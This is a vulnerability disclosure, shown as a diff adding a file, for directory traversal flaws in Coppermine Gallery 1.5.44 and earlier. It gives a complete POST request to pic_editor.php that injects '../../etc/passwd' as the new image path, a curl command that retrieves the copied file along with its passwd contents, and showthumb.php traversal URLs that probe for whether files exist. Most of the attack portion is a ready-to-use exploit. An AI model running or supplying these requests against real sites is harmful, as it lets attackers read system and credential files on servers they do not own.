@@ -1,0 +1,90 @@
+Coppermine Gallery <= 1.5.44 directory traversal vulnerability
+==============================================================
+Coppermine is a multi-purpose fully-featured and integrated web
+picture gallery script written in PHP using GD or ImageMagick as
+image library with a MySQL backend. A directory travesal vuln
+exists within the "save_thumb" function of the "crop & rotate"
+image feature. This can be accessed from pic_editor.php. First
+upload a file, e.g. "hackerhouse.png" to an album. This will
+create a predictable file path location with your userid e.g:
+
+http://target/cpg15x/albums/userpics/10001/hackerhouse.png
+
+You will then send a POST request to pic_editor to manipulate
+this file but replace the "new_image" with the filepath you
+want to read such as "../../../../../etc/passwd". Your file
+will then by copied to a predictible path location as thumb.
+
+http://target/cpg15x/albums/userpics/10001/thumb_hackerhouse.png
+
+To exploit this vulnerability you will need to be able to
+register an account and upload files to a photo album. You
+do not need admin rights to exploit this flaw. All versions
+from cpg 1.4.14 to cpg 1.5.44 have been found vulnerable
+to this flaw. The coppermine configuration was tested with
+ImageMagick enabled, your mileage may vary with GD1.x/GD2.x.
+
+To protect against this exploit do not allow public registration
+requests and only allow trusted users to modify images.
+
+Example POST request
+====================
+POST /cpg15x/pic_editor.php HTTP/1.1
+Host: target
+Content-Length: 802
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAE29AdEqShlpLpDF
+Accept: text/html,
+Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
+Cookie: <cookies>
+DNT: 1
+Connection: close
+
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="clipval"
+
+10
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="newimage"
+
+../../../../../../../../../../../../../../etc/passwd
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="img_dir"
+
+albums/edit/
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="id"
+
+1
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="angle"
+
+45
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+100
+------WebKitFormBoundaryAE29AdEqShlpLpDF
+Content-Disposition: form-data; name="save_thumb"
+ 
+ Save as thumbnail 
+------WebKitFormBoundaryAE29AdEqShlpLpDF-- 
+
+Example file download request
+=============================
+$ curl http://targetip/cpg15x/albums/userpics/10001/thumb_hackerhouse.png 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+... snip
+
+An additional directory traversal vulnerability is present
+in "showthumb.php" which can be used to stat() for the existence
+of files by reviewing the error returned. You must have 
+sufficient rights to use this feature however.
+
+/cpg15x/showthumb.php?picfile=../../../../../../etc/passwd
+/cpg15x/showthumb.php?picfile=../../../../../../etc/non-existantfile
+
+-- Hacker Fantastic
+ (http://www.myhackerhouse.com)
